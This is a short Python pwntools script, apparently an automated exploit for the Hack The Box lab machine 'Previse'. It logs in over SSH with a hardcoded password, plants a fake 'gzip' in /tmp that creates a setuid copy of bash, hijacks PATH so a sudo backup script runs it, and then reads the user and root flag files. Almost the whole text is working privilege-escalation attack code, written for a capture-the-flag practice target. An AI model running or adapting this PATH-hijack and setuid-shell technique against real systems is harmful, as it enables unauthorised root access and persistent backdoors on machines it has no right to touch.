#coded by vanishyi
from pwn import *
# HTB Previse autopwn

ip = input("put in the target ip address:").replace('\n','')

s = ssh(user='m4lwhere',host=ip,password='ilovecody112235!')

shell = "echo -ne '#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash' > /tmp/gzip"

#shell2 = "echo -ne '#!/bin/bash\nrm /tmp/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash' > /tmp/gzip"

s[shell]
s['chmod +x /tmp/gzip']
s["export PATH=/tmp:$PATH\necho 'ilovecody112235!' | sudo -S /opt/scripts/access_backup.sh"]


flag = "cat /home/m4lwhere/user.txt > f1.txt"
flag2 = "echo 'cat /root/root.txt > f2.txt' | /tmp/bash -p"

s[flag]
s[flag2]

a = "user flag: " + repr(s['cat f1.txt'])
b = "root flag: " + repr(s['cat f2.txt'])
print(a)
print(b)
